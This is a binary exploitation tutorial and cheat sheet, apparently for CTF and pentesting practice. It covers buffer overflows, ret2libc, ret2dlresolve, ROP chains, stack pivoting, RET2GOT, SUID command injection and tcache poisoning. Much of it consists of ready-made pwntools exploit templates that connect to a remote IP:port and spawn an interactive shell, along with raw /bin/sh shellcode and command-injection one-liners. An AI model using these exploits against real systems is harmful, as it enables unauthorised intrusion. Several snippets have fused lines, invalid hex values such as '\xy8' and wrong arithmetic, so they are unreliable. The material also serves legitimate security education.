# Binary Exploitation

### Buffer Overflow

#### Definition

A buffer overflow occurs when an application receives more input, or different input, than it expects. The result is an error that exposes system memory that would otherwise be protected and inaccessible. Normally, an application will have access only to a specific area of memory, called a buffer. The buffer overflow allows access to memory locations beyond the application’s buffer, enabling an attacker to write malicious code into this memory area. For example, an application may expect to receive a string of 15 characters for a username. If it receives more than 15 characters and tries to store the data in a buffer, it can cause a buffer overflow and expose system memory. Typically it will cause the known error `segmentation fault` which is is clear indication that the code is vulnerable to buffer overflow.

#### The main cause of BOF

* BOF happens when the program accepts a user input and doesn't perform the necessary checks to make sure it conforms to the parameters used to define variables. For example, a BOF can occur if the program defines a variable of `20` bytes for instance and then accepts an unlimited input size from the user. This will cause segmentation fault which is the first sign a program/binary is vulnerable to buffer overflow vulnerability
* Another example of BOF vulnerabilities is integer overflow vulnerabilities. This happens when a user input is stored in a variable declared as unsigned `uint`. In that case and to overflow the buffer, we send the maximum value `-1` t will be interpreted as `0xffffffffffffffff` if and only if the variable then was casted as `ulong` in the code.

#### BOF Exploitation

So the main gist of BOF exploitation is based in overflowing the binary with an expected input. Usually the program will crash because it doesn't know how to handle the input and cause a segmentation fault. In BOF, after we crash the program we aim to find the address in memory that highlights the start of our input. Then we need to find the memory address of the instruction pointer `EIP` or `RIP` after we have caused the crash. The goal is to find the difference (usually a hex subtraction) between the memory address of the input and the memory address of the instruction pointer. The result will be the number of bytes we need to send as an input to reach the return address or to overflow the instruction pointer. After this number of bytes we can write the shellcode and will be executed by the return address because we control it. This process can be accomplished also by finding the offset of the instruction pointer after we crash the program.

#### Common Binary Protections against BOF

* Checking if the binary has protections

```
root@kali:checksec –file=[name] 
```

if output shows NX is disabled then this means no protections

* Check if ASLR is enabled on target machine

```
cat /proc/sys/kernel/randomize_va_space
```

0 : means ASLR Disabled. 1: means enabled. 2: means enabled.

Below are the common protections and their meanings

* **NX** is a kind of protection where executing code in the stack is prohibited.
* **ASLR** is a kind of protection that randomizes memory addresses.
* **Stack Canary** a value written on the stack which is later checked to ensure it has not been overwritten; used to detect buffer overflows.
* **RELRO** Binary sections are in read-only preventing them from being modified.
* **Position Independent Executable (PIE)** the binary and all of its dependencies are loaded into random locations within virtual memory each time the application is executed
* A stripped binary is hard to reverse engineer and makes it difficult to find the `main` function because the debug information is basically stripped/removed. Additionally a stripped binary prevents you from setting a breakpoint using debuggers.

#### Common Definitions Before You Get Started

**Pointer** Programming languages commonly use pointers, which simply store a reference to a variable or object. Many programming languages refer to these pointers as references. In short, the pointer or reference is the memory address of the variable or object. **Compiler** A compiler converts code written in a programming language into a binary executable file. The compiler checks the program for errors and provides a report of items developers might like to check. Some commonly used compiled programming languages are C++, C#, and Java. **Cross Compiling** Cross compiling in simpler terms is compiling a binary to run on two platforms such as Linux and Windows together. **Null** Almost any programming language allows you to set an object or variable to null. In general, a value of null indicates an unknown value. Null isn’t nothing. It’s not true or false, 1 or 0, or any other defined value. It is completely unknown. When setting an object to null in any language, it can cause problems if the program later tries to access the object. An object whose value is set to Null and used later in the code could cause a crash at run time or a memory leak. **DLL Injection** DLL injection is an attack that injects a DLL into a system’s memory and causes it to run. For example, imagine an attacker creates a DLL named services.dll that includes several malicious functions such as one that will create a reverse shell and attaches the DLL to a running process that would make it to run the DLL instead of a legitimate one. **Debuggers** Debuggers can be used for various purposes such as revealing bugs in the code and performing dynamic analysis. Some debuggers are listed below

* `Immunity Debugger` is a debugger designed specifically to support penetration testing and thereverse engineering of malware.
* `GNU Debugger (GDB)` is a widely used open source debugger for Linux that works with a variety of programming languages.
* `OllyDbg` is a Windows debugger that works on binary code at the assembly language level.
* `WinDbg` is another Windows-specific debugging tool that was created by Microsoft.
* `Interactive Disassembler (IDA)` is a commercial debugging tool that works on Windows, Mac, and Linux platforms.
* `Covenant` is another Windows-specific command and control framework for .NET applications that includes a debugging tool.

#### Common Tips For BOF Exploitation

**TIP-ONE**

`Remember` After the segmentation fault, we want to find how many bytes (offset) we need to fill in order to reach the return address or the `EIP`. To achieve that with two ways **First method**:

* we can either find the offset of the ESP/RSP (stack pointer) which is supposed to be filled with the pattern we generated. Execute the below command in gdb

```
pattern offset 'pattern'
```

You may need to enter the first three chars (shown at the base pointer `EBP/RBP`)of the pattern and not all of it. This will give you the offset. **Second method** This method relies on finding the memory address of the start of your input. Your input is usually stored in a variable defined in the code so you have to find the memory address of that variable. Next hit the segmentation fault and find the address of `RIP/EIP` and do a hex subtraction of the two addresses will give you the offset.

**TIP-TWO**

Always use \[struct] module from python to evaluate expressions according to the little endian. An example is below to evaluate \[0x80002ff0] in little endian. This is becauase values are written into memory in reverse byte order

```python
python -c 'from struct import pack; pack("<L",0x80002ff0)' 
Output : \xf0\x2f\x00\x80
```

**TIP-Three**

Use \[r.interactive()] at the end of every exploit script you create incase you didn't receive a shell. \[r.interactive()] returns control in the terminal.

**TIP-Four**

If you experience problems while you are trying to catch the shell after exploiting buffer overflow then it likely means firewall is preventing egress connection from the target machine to yours. Change your shell code payload to the one below

```
shellcode[]=
"\x6a\x02\x5b\x6a\x29\x58\xcd\x80\x48\x89\xc6"
"\x31\xc9\x56\x5b\x6a\x3f\x58\xcd\x80\x41\x80"
"\xf9\x03\x75\xf5\x6a\x0b\x58\x99\x52\x31\xf6"
"\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
"\x89\xe3\x31\xc9\xcd\x80";
```

Source \[https://www.exploit-db.com/exploits/34060]

**TIP-Five**

With a stripped binary, to set a breakpoint at the main function first run the program in the debugger (gdb) then abort execution with `CTRL+C` to view the address of the main function. You can then use it to set a breakpoint \`b \*0x..

#### Tools and their installation

**Ghidra**

Making sure Java is installed

```
sudo apt update
sudo apt install default-jre 
sudo apt install default-jdk
```

Then download Ghidra from below link

```
https://www.github.com/NationalSecurityAgency/ghidra/releases
```

Uncompress the zipped file and give the required permisions

```
chmod +x ghidrarun
```

Run Ghidra

```
./ghidrarun
```

**GDB**

Install GDB

```
sudo apt-get install gdb
```

The below are supplementary plugins and features for gdb

**Peda**

Install with below two commands

```
git clone https://github.com/longld/peda.git ~/peda

echo "source ~/peda/peda.py" >> ~/.gdbinit
```

**GEF**

Install

```
$ wget -O ~/.gdbinit-gef.py -q https://gef.blah.cat/py

$ echo source ~/.gdbinit-gef.py >> ~/.gdbinit
```

and you can check the github repo

```
https://www.github.com/hugsy/gef
```

**Pwndb**

Installation

```
git clone https://github.com/pwndbg/pwndbg
cd pwndbg
./setup.sh
sudo pip3 install pwndbg
```

#### Exploiting Buffer overflow when NX is enabled using Ret2libc

Ret2libs techniques is designed to bypass NX protections. This technique consists of calling `system` inside Glibc using `"/bin/sh"` as first parameter to the function (which is also inside Glibc).Since we want to call `system` and take `"/bin/sh"`, we need to know the addresses of those values inside Glibc at runtime (these addresses will change in every execution). Hence, we must find a way to leak an address inside Glibc because the only thing that is random is the base address of Glibc; the rest of the addresses are computed as offsets to that base address.

\#Start the binary with gdb

```
Gdb -q ./[name]
```

\#Viewing the main code

```
Gdb-peda$:pdisass main
```

\#Generating a pattern

```
Gdb-peda$:Pattern_create 500
```

\#Next Run the pattern against the binary to see how many bytes required to overwrite the EIP

```
r '[pattern]'
```

OR

```
Gdb-peda$:run 'pattern'
```

\#After that, when you hit a segmentation fault take a note of the \[EIP]. We will assume it's \[0x41384142].

\#Next we find after how many bytes the application breaks hence we need to find the offset

```
pattern_offset 0x41384142
```

Take a note of the offset you found. Say it's \[110] it means the application breaks after \[110] bytes.

\#In order to get a shell, we need to find couple addresses such as \[system] and \[/bin/sh] in addition to \[exit]

```
Gdb-peda$:p system
```

\#Take note of the address. Say it's at \[0xb759c320] For \[/bin/sh] we add random data to system to reveal its address

```
find 0xb759c320, +9939401, "/bin/sh"
Or
find &system,+9999999,"sh"
```

\#Take a note of the address in output. Say it's \[0x76beb9e] You can verify its indeed for \[/bin/sh] by running below command in gdb

```
x/s 0x76beb9e
```

**Alternative way to find the address of \[/bin/sh]** On the target vulnerable machine, we store \[/bin/sh] in an environment variable called \[shellcode]

```
export shellcode=/bin/sh
echo shellcode
```

And then with a simple C program below we can find the address

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
int main(int argc, char **argv)
{
        char *ptr = getenv("shellcode");
        if (ptr != NULL)
        {
                printf("/bin/sh address: %p\n", ptr);
                return 0;
        }
}
```

Compile the code

```
gcc address-finder.c address-finder
```

And run

```
./address-finder
```

It should give you the address.

**Another Alternative way to find the address of \[/bin/sh]** On the target machine, we find the offset of \[/bin/sh] in \[libc] using the string command.

```
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```

Say the offset is \[0x0015ba2a] Next you need the address of \[libc] which you can get by running \[ldd] against the binary

```
ldd [binary-name]
```

Say it's \[0xb7e12000] then the final \[/bin/sh] address is **libc address + offset of \[/bin/sh]** \*\*0xb7e12000+x0015ba2a = 0xb7d72a2a

\#For the \[exit] address, we can find it same as we did for \[system].

```
Gdb-peda$:p exit
```

Say it's \[0xb758f234]

\#Lastly, we create a small script that contains all those values and send it in little endian format

```bash
while true; 

do /usr/local/bin/ovrflw $(python -c 'print "A" * [offset]+ "System + Exit + /bin/sh" '); 

done
```

Another way of creating the script using \[struct]

```python
import struct

buf = "A" * 80
system = struct.pack("I" ,0xb759c320)
exit = struct.pack("I" ,0xb758f234)
shell = struct.pack("I" ,0x76beb9e)

print buff + system + exit + shell
```

Run the script and pipe the output to the vulnerable program. Note: if you get an error such as

```
sh: 6: not found
```

This means that the address of \[/bin/sh] is not exact and you need to go up and down with the address. For example, the address we have in this scenario is \[0x76beb9e] all you have to do is to add increments or decrements to the address untill you get the right one. **Side Note** In the above method, sometimes you may need to find the address of \[execl] instead of \[system]. The reasons is sometimes you run out of virtual memory which makes the exploit fails. In that case use \[execl] instead.

#### Exploiting Buffer overflow when NX is enabled using ret2dlresolve

In this technique, we aim to link a system function that's not already linked to the binary (not in called in the code). Our aim is to link the `system('/bin/sh')`. This can be accomplished using pwntools from python wich does contain an implementation of [`Ret2dlresolvePayload`](https://docs.pwntools.com/en/stable/rop/ret2dlresolve.html)

#### With gdb+peda

```
gdb -q ./binary
```

\#Generating a pattern

```
Gdb-peda$:Pattern_create 500
```

\#Running the pattern against the binary

```
Gdb-peda$:run 'pattern'
```

\#Finding the offset of the stack pointer

```
pattern offset [address of EIP/RSP]
```

OR

```
pattern search [address of EIP/RSP]
```

Once you find the offset, say it's at `70` then you can use the below script to gain shell

```python
from pwn import *
****
context.binary = 'binaryname'

rop = ROP(context.binary)
dlresolve = Ret2dlresolvePayload(context.binary, symbol='system', args=['/bin/sh\0'])

rop.read(0, dlresolve.data_addr)
rop.raw(rop.ret[0])
rop.ret2dlresolve(dlresolve)
raw_rop = rop.chain()

if len(sys.argv) == 1:
    p = context.binary.process()
else:
    host, port = sys.argv[1].split(':')
    p = remote(host, port)

p.sendline(b'A' * 72 + raw_rop)
p.sendline(dlresolve.payload)
p.interactive()
```

In the above script we use pwntools to call the `Ret2dlresolvePayload` to be able to link the system function to the binary. Make sure to change the number of bytes in the offset according to your numbers along with the binary name in the variable `context.binary`. Then run as below

```
script.py ip:port
```

#### Exploiting BOF | NX Enabled | Using Gadgets and ROP Chains

The same drill as always. We hit the binary with segmentation fault and find the offset.

Gadgets are sets of instructions that end in `ret`. Every gadget has an address which we can add on the stack so that when a gadget is executed it returns to the stack and executes the next gadget if exists which eventually forms the `ROP Chain`

To exploit BOF using this method we have to create a ROP chain that consists mainly of the below

```
1- padding: the offset we found earlier
2- Gadget Address: pop rdi, ret;
The gadget will pop the stack content inside rdi
3- Storing "/bin/sh\x00" in a memory address that we can control
4- Making a system call to execute system("/bin/sh");
```

Regarding step 2 `Gadget Address` can be found using a tool named [ROPgadget](https://github.com/JonathanSalwan/ROPgadget)

```
ROPgadget --binary bof
```

and then find the address where it corresponds to `pop rdi, ret` thus you have the gadget address.

Below is an example python exploitation script for this scenarios

```python
#!/bin/python3

from pwn import *

HOST = <ip_address>  
PORT = <port>

#Connect to the remote server  
r = remote(HOST, PORT)

#Define the address of the gadget  
pop_rdi = gadget-address # change this

#Write "/bin/sh\x00" inside the .bss 

r.recvuntil('>> ')  
r.sendline('hof')

payload  = b'/bin/sh'.ljust(16, b'\x00')

r.recvuntil('Enter your name: ')  
r.sendline(payload)

#Exploit the buffer overflow  
r.recvuntil('>> ')  
r.sendline('flag')payload  = b'\x90'*24  
payload += p64(pop_rdi)  
payload += p64(0x004040b0)  
payload += p64(0x00401381)r.recvuntil('Enter flag: ')  
r.sendline(payload)r.interactive()
```

#### Exploiting BOF with NX and PIE enabled using ret2libc and stack pivoting.

Bypassing NX and PIE requires a two step process:

* Leaking a base memory address from the vulnerable binary
* Constructing the ROP chain.
* Creating enough space for the ROP chain to be executed in the stack
* Bypassing ASLR protection by finding the Glibc address
* Finding the offset of `system` and `/bin/sh`
* Putting it altogether in an exploit script

**Leaking the base memory address** The base memory address can be found by executing the below command in gdb with gef plugin enabled

```
p/x start memory address- start of user input memory address
```

A start memory address can be found by displaying the memory mappings with the below command

```
vmmap
```

You can grab the first memory address under `start` The start of user input memory address can be found by finding the memory address that highlights the start of the input. This can be extracted by sending a test user input to the binary such as `test` and then we use `pattern search` or `grep` depending if you are using `gdb with peda` or `gdb with gef` respectively.

```
grep test
pattern search test
```

This will give you the memory address that highlights the start of the user input. Example output is below

```
gef➤ grep test

[+] Searching 'test' in memory 
[+] In '[stack]'(0x7ffffffde000-0x7ffffffff000), permission=rw- 
0x7fffffffe620 - 0x7fffffffe626 → "test\n"
```

From above output we can then execute the below command

```
x/20gx 0x7fffffffe620
```

An example output is below

```
gef➤ x/20gx 0x7fffffffe620 0x7fffffffe620: 0x0000000a66647361 0x0000000000000000 

0x7fffffffe630: 0x0000000000000000 0x0000000000000000 

0x7fffffffe640: 0x0000000000000000 0x00005555555580c0 

0x7fffffffe650: 0x0000000000000032 0x0000000000000032 

0x7fffffffe660: 0x0000555555556123 0x00005555555550fe 

0x7fffffffe670: 0x0000555555555360 0x0000555555555360 

0x7fffffffe680: 0x0000000000000000 0x00007ffff7de1083 

0x7fffffffe690: 0x00007ffff7ffc620 0x00007fffffffe778 

0x7fffffffe6a0: 0x0000000100000000 0x00005555555550a0 

0x7fffffffe6b0: 0x0000555555555360 0x4f8b73ff7c1dbc64
```

From the output above the start can be `0x00005555555580c0` then the base memory address can be found by executing the below

```
gef➤ p/x 0x00005555555580c0 -0x00555555554000 

$1 = 0x40c0
```

The offset `0x40c0` can then be used below to find the base address.

```
base_address = leaked_memory_address - 0x40c0
log.success(f'base address: {hex(base_address)}')
```

**Creating The ROP Chain** To create the ROP chain, we need to get the below offsets `pop rdi; ret`

```
ROPgadget --binary pwnshop | grep 'pop rdi'
```

`setvbuf`

```
objdump -M intel -R pwnshop | grep setvbuf
```

`<puts@plt>`

```
objdump -M intel -d pwnshop | grep '<puts@plt>:'
```

After finding the above offsets along with the base address we can formulate them below. You can use them in any exploit script.

```
pop_rdi_ret = base_addr + 0x13c3 setvbuf_got_addr = base_addr + 0x4048 puts_plt_addr = base_addr + 0x1030 
```

**Creating enough space for the ROP chain to be executed in the stack** Execute the below command

```
ROPgadget --binary binary-name | grep rsp
```

If you find something similar to the output below

```
sub rsp, 0x50 ; ret
```

You can grab its offset. The above will create 50 bytes space. Then we can put it together

```
stack_pivot = base_addr + offset
```

**Bypassing ASLR protection by finding the Glibc address** First we list the shared libraries dependencies of the binary

```
ldd binary-name
```

Based on the output above we can find the setvbuf offeset

```
readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep setvbuf
```

To find the Glibc base address we need the offset of setvbuf and setvbuf address

```
glibc_addr = setvbuf_addr - setvbuf_offset
```

**Finding the offset of `system` and `/bin/sh`** offset of `system`

```
readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system
```

Offset of `"/bin/sh"`

```
strings -atx /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh
```

And then we calculate the addresses as below

```
system_addr = glibc_addr + system_offset
bin_sh_addr = glibc_addr + bin_sh_offset
```

**Putting it altogether in an exploit script** The example python script below represents some of the variables that you need to calculate and the final payload. It also assumes that you are exploiting the binary remotely through IP:Port combinations

This script needs to be modified to fit to your scenario. Additionally it only includes the payload with the necessary memory addresses.

```python
#!/usr/bin/env python3

from pwn import *

context.binary = 'BINARY-NAME'

def get_process():
    if len(sys.argv) == 1:
        return context.binary.process()
        
    host, port = sys.argv[1].split(':')
    return remote(host, int(port))


def main():
    p = get_process()


    base_addr = leaked_addr - 0x40c0
    log.success(f' base address: {hex(base_addr)}')

    stack_pivot = base_addr + 0x1219
	pop_rdi_ret = base_addr + 0x13c3        
	setvbuf_got_addr = base_addr + 0x4048 
	puts_plt_addr = base_addr + 0x1030

    payload  = b'B' * 8 * 5
    payload += p64(pop_rdi_ret)
    payload += p64(setvbuf_got_addr)
    payload += p64(puts_plt_addr)
    payload += p64(stack_pivot)

    glibc_addr = setvbuf_addr - setvbuf_offset
    log.success(f'Glibc base address: {hex(glibc_addr)}')

    system_addr = glibc_addr + system_offset
    bin_sh_addr = glibc_addr + bin_sh_offset

    payload  = b'A' * 8 * 5
    payload += p64(pop_rdi_ret)
    payload += p64(bin_sh_addr)
    payload += p64(pop_rdi_ret + 1)
    payload += p64(system_addr)
    payload += p64(stack_pivot)

    p.sendafter(b'Enter details: ', payload)
    p.interactive()


if __name__ == '__main__':
    main()
```

#### Exploiting BOF without ASLR and binary protections.

**With gdb+peda**

\#Start the binary with gdb

```
Gdb -q ./[name]
```

\#Viewing the main code

```
Gdb-peda$:pdisass main
```

\#Generating a pattern

```
Gdb-peda$:Pattern_create 500
```

\#Running the pattern against the binary

```
Gdb-peda$:run ‘pattern’
```

**OR you can generate the pattern with python if you don't have \[peda]**

```
(gdb) run $(python -c 'print "A"*500')
```

**OR You can again generate a pattern with \[MSF]**

```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 500
```

\#Note down the value at the EIP and feed it to pattern\_offset to find the offset

```
Gdb-peda$:pattern offset [value]
```

**Alternatively, you can find the offset with \[MSF]**

```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 500 -q [value-at-EIP]
```

\#In this step, we use a shellcode that spawns \[/bin/sh] and send it to the program as part of the script below. We also use \[nop] which let the cpu do nothing to prevent the execution from failing. The purpose of the script below is to send our shellcode and write 4 \[Bs] in order to understand and find where will be the address of our shellcode.

```
buf_size=[offset-found-from-above]
shell_code = "\x31\xc0\x50\x68\x2f\x2f\x73"
shell_code += "\x68\x68\x2f\x62\x69\x6e\x89"
shell_code += "\xe3\x89\xc1\x89\xc2\xb0\x0b"
shell_code += "\xcd\x80\x31\xc0\x40\xcd\x80";
nop_sled = "\x90"*(buf_size-len(shell_code))
stack-address = "B" * 4
payload = nop_sled + shell_code + stack-address
print payload
```

```
Gdb-peda$:run $(python shell.py)
```

```
Gdb-peda$: x/500x $esp-500 : examining the esp
```

\#Here we look where our \[shellcode] starts in memory. To make things easier, look where is the last occurenace of \[x90] and mark the corresponding memory address. It will be the address of your \[shellcode]. But to make this work, we can pick up any address in the mids of \[x90]. Say it's \[0xbffff550] Updating the script:

```
buf_size=[offset-found-from-above]
shell_code = "\x31\xc0\x50\x68\x2f\x2f\x73"
shell_code += "\x68\x68\x2f\x62\x69\x6e\x89"
shell_code += "\xe3\x89\xc1\x89\xc2\xb0\x0b"
shell_code += "\xcd\x80\x31\xc0\x40\xcd\x80";
nop_sled = "\x90"*(buf_size-len(shell_code))

eip = "\xb0\xf7\xff\xbf" #0xbffff550
payload = nop_sled + shell_code + eip
print payload
```

```
Gdb-peda$:run $(python shell.py)
```

And wait for the shell.

More code templates that you can use are below. Remember to adapt these templates to the user input the binary expects. #template-1 **Remote Binary**

```python
from pwn import * 

context.binary = ELF('./binary-name') # CHANGE-THIS 

p = remote('IP',PORT) 

# Use the sendline to process your input into the binary
p.sendline('1')  

# Use recvuntil to process any output from the binary. The example below is processing a memory address leaked from the binary.

p.recvuntil('0x') 
stack_base = int(("0x"+p.recv().decode('latin-1').split()[0]),16) 
log.success(f'stack base: {hex(stack_base)}')

p.sendline('2') 
p.sendline('b4tp@$$w0rd!') 

# Below we generate shellcode
payload = asm(shellcraft.popad() + shellcraft.sh()) # shellcode 

# Below we calculate the padding or the nop
payload += b'A'*(84 - len(payload)) # junk

# below we formulate the final payload with the stack address
payload += p64(stack_base) 

p.sendline(payload) p.sendline('3') 

# below to get interactive shell
p.interactive()
```

\#template-2 **Remote Binary** The below code expects you to supply the connection parameters instead of hardcoding them.

```python
#!/usr/bin/env python3

from pwn import *

context.binary = 'binary-name' #CHANGE-THIS

# Below is function that expects you to provide the connection parameters as IP:PORT

def get_process():
    if len(sys.argv) == 1:
        return context.binary.process()

    host, port = sys.argv[1].split(':')
    return remote(host, int(port))


def main():
    p = get_process()

# Below processes the user input
    p.sendlineafter(b'Would you like to enroll yourself? (y/n): ', b'y')

# Below processes binary output which was a leaked memory address

    p.recvuntil(b'Great! Here\'s a small welcome gift: ')
    stack_leak = int((p.recvline().decode('latin-1').split()[0]),16)
    log.info(f'Stack leak: {hex(stack_leak)}')


# Alphanumeric shellcode
    shellcode = b'XXj0TYX45Pk13VX40473At1At1qu1qv1qwHcyt14yH34yhj5XVX1FK1FSH3FOPTj0X40PP4u4NZ4jWSEW18EF0V'


# processing user input
    p.sendafter(b'Email: ', shellcode[:8])
    p.sendafter(b'Age: ', shellcode[8:16])
    p.sendlineafter(b'Length of name: ', b'-1')

# Defining the payload components
    offset = 104 #CHANGE-THIS
    
# Shifting the stack address 96 bytes to be at the beginning of the input. The input variable size was defined as 96 bytes

    stack_leak = stack_leak - 96

# Calculatiing the padding or the nop
    nop = b'A' * (offset - len(shellcode))

# Final Payload
    payload = shellcode + nop + p64(stack_leak)

# Sendling the payload 
    p.sendafter(b'Name: ', payload)

# Interactive shell
    p.interactive()


if __name__ == '__main__':
    main()
```

#### Using pwndbg to exploit BOF

\#Installation

```
git clone https://github.com/pwndbg/pwndbg
cd pwndbg
./setup.sh
echo 'source ~/pwndbg/gdbinit.py' >> ~/.gdbinit
```

\#Now when you run gdb it will be poped there by default. A typical scenario is when you have a binary say it was \[bof] First we run it with \[gdb]

```
gdb bof
```

\#Assuming the binary crashes if we provide input more than \[30] characters, we can generate a cyclic input of \[50] characters to crash the application

```
r < <(cyclic 50)
```

\#Take a note of the address of \[EIP]. Say it crashed at \[0x6161616b]. The next step is to find how many characters are needed before we overwrite the \[EIP]. This corresponds with finding the offset if you are using \[gdb] alone or with \[peda].

```
cyclic -l 0x6161616b
```

\#Assume the number of characters in the output was \[45]. This means after \[45] characters we can write our own payload and make EIP execute it. Now from here you can either pick-up a shell code that spawns a shell

```
"\x31\xc0\x31\xdb\xb0\x06\xcd\x80"
"\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80"
"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
```

\#And if you want to use it inside a script, then use below

```
shell_code = "\x31\xc0\x50\x68\x2f\x2f\x73"
shell_code += "\x68\x68\x2f\x62\x69\x6e\x89"
shell_code += "\xe3\x89\xc1\x89\xc2\xb0\x0b"
shell_code += "\xcd\x80\x31\xc0\x40\xcd\x80";
```

\#then you can send a payload constituting of \[nop] + \[shellcode] + \[address of the eip where its overwritten with your pattern (As) or (Bs)]. See examples from the previous sections.

\#OR you can change the execution flow of the program to another function. Say the binary you are exploiting has a function that let you spawn a shell. Call the function \[shell]. By finding the address of the function, you can add it to a pattern and change the exection. Finding the address of the \[shell] function.

```
gdb: dissassemble shell
```

This will give you an assembly code of the function. Pick the first address. Assume it's \[0x080484cd]. Then your final payload is

```
payload = pattern + 0x080484cd
example:
payload = python -c 'print "B"*45 + "\xcd\x84\x04\x08"'
```

Send this payload to the binary by piping the its output to the binary

```
python -c 'print "B"*45 + "\xcd\x84\x04\x08"' | BOF
```

After this, the binary will execute whatever the \[shell] function was supposed to do hence you changed program execution using BufferOver flow.

#### RET2GOT: BOF when NX and ASLR protections are enabled. \[ldd]

To perform the RET2GOT technique, we have the find couple addresses. The below commands are to be issued on the compromised machine

**Find libc address**

```
ldd [path to bof binary]
```

**Find libc system function:**

\[1]

```
readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system
```

\[2]

```
readelf -s /lib32/libc.so.6 | grep system 
```

**Find libc exit function**

```
readelf -s /lib32/libc.so.6 | grep exit 
```

**Find libc /bin/sh reference**

\[1]

```
strings -a -t x /lib32/libc.so.6 | grep /bin/sh
```

\[2]

```
strings -atx /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh
```

Then we can use a script like below and execute on the target machine

```python
import struct, subprocess 
libc = 0xf75e2000 
sysOffset = 0x0003a940 
sysAddress = libc + sysOffset 
exitOffset = 0x0002e7b0 
exitAddress = libc + exitOffset 
binsh = libc + 0x0015900b 

bofshell = "A" * 512 
bofshell += struct.pack("<I",sysAddress)
bofshell += struct.pack("<I",exitAddress)
bofshell += struct.pack("<I",binsh)

trials = 0 
while True: 
		trials += 1 
		print "Trying: " + trials subprocess.call(["[path-to-binary]","-i", "3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110", bofshell])
```

#### RET2GOT: BOF when NX and ASLR protections are enabled. \[Radare2]

We follow the same methodology as above but using radare2 we can find the addresses of \[system] \[exit] and \[/bin/sh]

We use `aa` to analyze the binary and `afl` to list the functions in the binary.

```
aa
fs imports; f
fs strings; f
```

* `afl` or `fs imports;f` are to display functions
* `iz` or `fs strings; f` are to display strings
* `ie` and `iM` commands are to find the entry point address and main function address locations respectively.
* Additionally in Radare2, you can find address locations of a specific string by typing `/ keyword`
* Use `V` to enter visual mode and `q` to quit
* If you wish to select a function and display its disassembly then simply type `s sym.functionname` and then `pdf` to display its disassembly If you couldn't find the address of \[/bin/sh] using \[radar2] then you can issue the below command on the target machine

```
strings -a -t x /lib32/libc.so.6 | grep /bin/sh
```

Lastly your payload is a oneliner. Make sure to know how many bytes are needed to cause segmentation fault. In the below example it's \[600]. Also my values were

**system address = 0x040584y8** **exit address =0x090287b0** **/bin/sh = 0x010293d4** The final payload:

```
$(python2 -c 'print("A"*600+"\xy8\x84\x05\x04"+"\xb0\x87\x02\x09"+"\xd4\x93\x02\x01")')
```

You can pass it as an argument to the binary.

#### Exploiting BOF When PIE is enabled

PIE stands for Position Independent Executable, which means that every time you run the file it gets loaded into a different memory address. This means you cannot hardcode values such as function addresses and gadget locations without finding out where they are.

The strategy of exploiting such binaries relies on finding the offsets/locations of different parts/variables/functions that we want to control. Usually we want to control a function/variable so we try to find the distance between the offset of this variable and another variable that's controlled by user input.

This can be done using any debugger such as gdb.

Let's say a user input is taken and assigned to variable `A` and we want to control the value of another variable `B`.

First we set a breakpoint exactly after the function that's responsible for retrieving user input. Say it's `getf`. In gdb this would be

```
gdb -q ./binary
b *main+50
```

Now `50` could be anything else that corresponds to the address of the `getf`. You can find this number by executing the below in gdb and locating the line that mentions `getf` or the function that takes user input.

```
disass main
```

Back to the breakpoint, after setting the breakpoint you can continue running the program

```
r
```

Enter your input and then observe the stack of the program. Highlight the hex location of your input and the location of the variable you want to control. Subtract them and convert to decimal. This would give you how many bytes you need to provide in the user input to reach the variable you want to control.

Then an exploit code can be like the sample below. The below sample assumes that you are exploiting the binary by connecting to it via netcat.

It also assumes that you have calculated the distance between the desired variables we talked about above and it was `60`

Next the script also assumes that your payload needs 60 byte to reach another variable which needs to be of a certain value in hex (this value can be found by using Ghidra or a debugger). If that variable was equal to this `value` then it enters an if statement and execute our code whose output is received in the last line of the code

```python
from pwn import *

target = process("nc") 

target.sendline("ip port")

payload = "A"*60  

byte_to_string = p64(value)

payload = payload + byte_to_string.decode("ISO-8859-1")

target.sendline(payload)  

print target.recvuntil(".")
```

The `value` below should correspond to the value of the variable that you want to control. This variable could hold this value in an if statement and you want to let the program execution flow to enter the if statement so you want to make that variable equal to this value

```
byte_to_string = p64(value)
```

The below line just converts the byte value in `byte_to_string` to a string that can be concatenated with the payload of `60 As`

```
payload = payload + byte_to_string.decode("ISO-8859-1")
```

Make sure to replace the IP,PORT with the values.

### Exploiting SUID Bit Binaries\[s]

First we check if the binary is listed in the below website

```
https://gtfobins.github.io/
```

If it's not then we can follow the below checklist

**Checking system calls**

we use \[ltrace] to checkout the libraries and system calls in the applications. This reveals insights on how the application using passing its arguments and how system calls are being made. Sometimes hardcoded credentials can be found.

```
ltrace [path-to-binary]
```

**Use radare2 and print a visual representation of the code**

**cases**

**case \[1] The binary passes one of its arguments to \[system]**

In this case, command injection is highly possible. We try to pass system commands in place of the argument being passed to \[system()]. For example, a binary that performs backup and passes the argument,thattakes in the source directory, to system(). #EX

```
./backup [path-to-directory]
```

We can execute sys commands in the argument as below. This will give and call \[/bin/sh]

```
./backup "$(printf '\n/bin/sh\necho OK')"
```

\[OR]

```
./backup $'\n /bin/sh \n echo OK'
```

\[OR]

```
./backup "bash #"
```

#### Buffer Overflow on Double Free Vulnerabilities

**TCACHE poisoning**

This BOF techniques relies in heap exploitation. The discussed method below is TCACHE poisoning.

Tcache poisoning grants a potential write-what-where primitive. Also, the Tcache is a very exploitable structure because it applies only a few checks and they can be easily bypassed.

**Unsorted Bin chunk**

This type of vulnerabilities happen when the `free()` function is called twice on the same variable without checking if it's free or not which would lead to leaking memory addresses. This leads to corruption in memory management in the program thus allowing the attacker to write arbitrary values in the memory space to allow for code execution.

